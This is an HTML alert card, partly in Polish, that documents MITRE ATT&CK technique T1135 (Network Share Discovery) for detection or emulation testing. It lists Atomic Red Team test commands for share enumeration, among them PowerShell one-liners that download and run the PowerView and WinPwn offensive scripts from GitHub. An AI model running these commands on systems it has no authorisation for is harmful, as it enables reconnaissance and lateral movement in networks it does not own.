<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <title>Alert: Network Share Discovery</title>
  <style>
    body { font-family: Segoe UI, Arial, sans-serif; margin: 2rem; background: #f6f7fb; }
    .card { background: #fff; border-radius: 10px; box-shadow: 0 2px 6px #bbb; padding: 2rem; max-width: 700px; margin: auto; }
    h1 { margin-top: 0; font-size: 2rem; }
    .desc, .id, .link, .author, .tactic, .status { margin-bottom: 1.1em; }
    .meta { font-size: .95em; color: #555; margin-bottom: .8em; }
    .section { font-size: .99em; }
    .scenario-block { background: #f4f0d9; border-radius: 7px; padding: 1em 1.2em; margin-bottom: 1.2em; color:#4a4500; font-size:1.07em; border-left:5px solid #e1c553; }
    pre { background: #eee; padding: .7em 1em; border-radius: 5px; }
    code { background: #f6f6f6; padding: 2px 5px; border-radius: 2px; }
    ul { margin-left: 1.6em; }
  </style>
</head>
<body>
<div class="card">
  <h1>Alert: Network Share Discovery</h1>
  <div class="meta"><b>Technique ID:</b> T1135<div style='background:#eaf4ff;border-radius:8px;padding:15px 16px;margin-top:25px;'><b>Atomic Red Team – dostępne testy dla tej techniki:</b><ul><li><b>Network Share Discovery command prompt</b><br><b>Polecenia testowe (cmd):</b><pre>net view \\#{computer_name}</pre><a href='../../scenarios/atomic_tests\T1135\Network_Share_Discovery_command_prompt/test_1.cmd'>Pobierz test_1.cmd</a><br></li><li><b>Network Share Discovery PowerShell</b><br><b>Polecenia testowe (powershell):</b><pre>get-smbshare</pre><a href='../../scenarios/atomic_tests\T1135\Network_Share_Discovery_PowerShell/test_1.ps1'>Pobierz test_1.ps1</a><br></li><li><b>View available share drives</b><br><b>Polecenia testowe (cmd):</b><pre>net share</pre><a href='../../scenarios/atomic_tests\T1135\View_available_share_drives/test_1.cmd'>Pobierz test_1.cmd</a><br></li><li><b>Share Discovery with PowerView</b><br><b>Polecenia testowe (powershell):</b><pre>[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose</pre><a href='../../scenarios/atomic_tests\T1135\Share_Discovery_with_PowerView/test_1.ps1'>Pobierz test_1.ps1</a><br></li><li><b>PowerView ShareFinder</b><br><b>Polecenia testowe (powershell):</b><pre>Import-Module "PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1"
Invoke-ShareFinder #{parameters}</pre><a href='../../scenarios/atomic_tests\T1135\PowerView_ShareFinder/test_1.ps1'>Pobierz test_1.ps1</a><br></li><li><b>WinPwn - shareenumeration</b><br><b>Polecenia testowe (powershell):</b><pre>iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
shareenumeration -noninteractive -consoleoutput</pre><a href='../../scenarios/atomic_tests\T1135\WinPwn_-_shareenumeration/test_1.ps1'>Pobierz test_1.ps1</a><br></li><li><b>Network Share Discovery via dir command</b><br><b>Polecenia testowe (cmd):</b><pre>dir \\#{computer_ip}\c$
dir \\#{computer_ip}\admin$
dir \\#{computer_ip}\IPC$</pre><a href='../../scenarios/atomic_tests\T1135\Network_Share_Discovery_via_dir_command/test_1.cmd'>Pobierz test_1.cmd</a><br></li><li><b>Enumerate All Network Shares with SharpShares</b><br><b>Polecenia testowe (powershell):</b><pre>cmd /c '#{sharp_path}' /ldap:all | out-file -filepath "#{output_path}"</pre><a href='../../scenarios/atomic_tests\T1135\Enumerate_All_Network_Shares_with_SharpS/test_1.ps1'>Pobierz test_1.ps1</a><br><b>Polecenia cleanup (powershell):</b><pre>remove-item "#{output_path}" -force -erroraction silentlycontinue</pre><a href='../../scenarios/atomic_tests\T1135\Enumerate_All_Network_Shares_with_SharpS/cleanup_1.ps1'>Pobierz cleanup_1.ps1</a><br></li><li><b>Enumerate All Network Shares with Snaffler</b><br><b>Polecenia testowe (powershell):</b><pre>invoke-expression 'cmd /c start powershell -command { cmd /c "#{snaffler_path}" -a -o "#{output_path}" }; start-sleep 90; stop-process -name "snaffler"'</pre><a href='../../scenarios/atomic_tests\T1135\Enumerate_All_Network_Shares_with_Snaffl/test_1.ps1'>Pobierz test_1.ps1</a><br><b>Polecenia cleanup (powershell):</b><pre>remove-item "#{output_path}" -force -erroraction silentlycontinue</pre><a href='../../scenarios/atomic_tests\T1135\Enumerate_All_Network_Shares_with_Snaffl/cleanup_1.ps1'>Pobierz cleanup_1.ps1</a><br></li></ul><a href='https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1135' target='_blank'>Zobacz wszystkie testy na GitHubie</a></div></div>
  <div class="tactic section"><b>Tactics:</b> <a href="https://attack.mitre.org/tactics/TA0007/" target="_blank">Discovery (TA0007)</a></div>
  <div class="status section"><b>Status:</b> Pending</div>
  <div class="scenario-block"><b>Twój opis scenariusza:</b><br>Opis scenariusza, podatności lub techniki.</div>
  <div class="desc section"><b>MITRE Description:</b><br>Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network.   File sharing over a Windows network occurs over the SMB protocol. (Citation: Wikipedia Shared Resource) (Citation: TechNet Shared Folder) [Net](https://attack.mitre.org/software/S0039) can be used to query a remote system for available shared drives using the <code>net view \\\\remotesystem</code> command. It can also be used to query shared drives on the local system using <code>net share</code>. For macOS, the <code>sharing -l</code> command lists all shared points used for smb services.</div>
  <div class="link section"><b>MITRE Link:</b> <a href="https://attack.mitre.org/techniques/T1135/" target="_blank">https://attack.mitre.org/techniques/T1135/</a></div>
  <div class="author section"><b>Author:</b> Krzysztof K.</div>
</div>
</body>
</html>
